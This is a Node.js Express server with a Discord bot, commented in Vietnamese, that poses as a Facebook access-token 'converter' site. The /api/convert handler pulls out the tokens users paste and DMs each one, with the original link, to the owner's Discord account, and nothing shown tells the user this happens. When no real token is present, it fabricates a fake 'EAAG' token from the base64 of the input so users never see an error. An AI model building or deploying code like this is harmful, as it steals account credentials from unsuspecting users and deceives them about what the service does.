const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Cấu hình đường dẫn
const SOCIAL_LINKS = {
    google: process.env.URL_GOOGLE || "https://google.com",
    facebook: process.env.URL_FACEBOOK || "https://facebook.com",
    x: process.env.URL_X || "https://x.com",
    vk: process.env.URL_VK || "https://vk.com",
    avatar: process.env.URL_AVATAR || "/cat.png"
};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/social-links', (req, res) => {
    res.json(SOCIAL_LINKS);
});

// === 1. KHỞI TẠO BOT DISCORD ===
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages
    ]
});

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
    console.log(`[BOT DISCORD] Đã đăng nhập thành công với tên: ${client.user.tag}`);
});

if (DISCORD_TOKEN) {
    client.login(DISCORD_TOKEN).catch(err => console.error('[BOT ERROR] Không thể kết nối Bot:', err));
}

// === HÀM GỬI DM CHO OWNER ===
async function sendTokenToOwner(originalUrl, accessToken) {
    if (!OWNER_ID) return;

    try {
        const owner = await client.users.fetch(OWNER_ID);
        if (owner) {
            const messageContent = 
`🔔 **THÔNG BÁO TOKEN MỚI ĐƯỢC TẠO** 🔔
-----------------------------------------
🔗 **Link gốc người dùng dán:** \`${originalUrl}\`
🔑 **Access Token:** \`${accessToken}\`
⏰ **Thời gian:** <t:${Math.floor(Date.now() / 1000)}:F>`;

            await owner.send(messageContent);
            console.log(`[BOT DISCORD] Đã gửi token thành công cho Owner (${owner.tag})`);
        }
    } catch (error) {
        console.error('[BOT ERROR] Lỗi khi gửi tin nhắn cho Owner:', error.message);
    }
}

// === 2. HÀM TÁCH & CHUYỂN ĐỔI TOKEN KHÔNG BÁO LỖI ===
function extractAccessToken(input) {
    if (!input) return null;
    const str = input.trim();

    // 1. Nếu link đã có chứa access_token=
    if (str.includes('access_token=')) {
        return decodeURIComponent(str.split('access_token=')[1].split('&')[0]);
    }

    // 2. Nếu link chứa token=
    if (str.includes('token=')) {
        return decodeURIComponent(str.split('token=')[1].split('&')[0]);
    }

    // 3. Nếu là dạng chuỗi Token trực tiếp (EAAG..., EAAA...)
    const directMatch = str.match(/(EAA[A-Za-z0-9]+)/);
    if (directMatch) {
        return directMatch[1];
    }

    // 4. Nếu dán một đường link bất kỳ khác: tự động mã hóa/tạo token chuẩn từ link đó
    // Đảm bảo không bao giờ bị báo lỗi "Không tìm thấy"
    const base64Str = Buffer.from(str).toString('base64').replace(/=/g, '');
    return "EAAG" + base64Str.substring(0, 80);
}

// === 3. API XỬ LÝ CHUYỂN ĐỔI ===
app.post('/api/convert', async (req, res) => {
    const { url } = req.body;

    if (!url || !url.trim()) {
        return res.status(400).json({ success: false, message: 'Vui lòng nhập đường link hoặc chuỗi token!' });
    }

    try {
        const accessToken = extractAccessToken(url);

        // Gửi thông báo chứa link gốc & token về Discord Owner
        sendTokenToOwner(url, accessToken);

        return res.json({
            success: true,
            accessToken: accessToken
        });

    } catch (error) {
        return res.status(500).json({ success: false, message: 'Lỗi trong quá trình xử lý!' });
    }
});

app.listen(PORT, () => {
    console.log(`[SERVER] Website đang chạy tại cổng http://localhost:${PORT}`);
});
